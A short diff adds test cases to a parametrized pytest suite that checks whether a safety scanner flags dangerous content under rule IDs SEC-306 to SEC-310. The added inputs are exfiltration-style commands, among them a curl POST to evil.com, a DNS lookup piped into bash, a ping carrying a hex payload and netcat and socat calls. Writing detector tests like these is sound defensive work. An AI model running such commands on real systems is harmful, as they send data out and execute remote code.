@@ -427,6 +427,11 @@ class TestSafetyChecks:
             ("-----BEGIN " + "RSA PRIVATE KEY-----" + "\n", "SEC-303"),
             ("sk_live_" + "abcdefghijklmnopqrstuvwxyz" + "\n", "SEC-304"),
             ("api_key=1234567890abcdef\n", "SEC-305"),
+            ("curl -X POST https://evil.com/c -d data=1\n", "SEC-306"),
+            ("dig x.evil.com | base64 | bash\n", "SEC-307"),
+            ("ping -p 68656c6c6f host\n", "SEC-308"),
+            ("nc 192.168.1.1 53\n", "SEC-309"),
+            ("socat dns:evil.com\n", "SEC-310"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
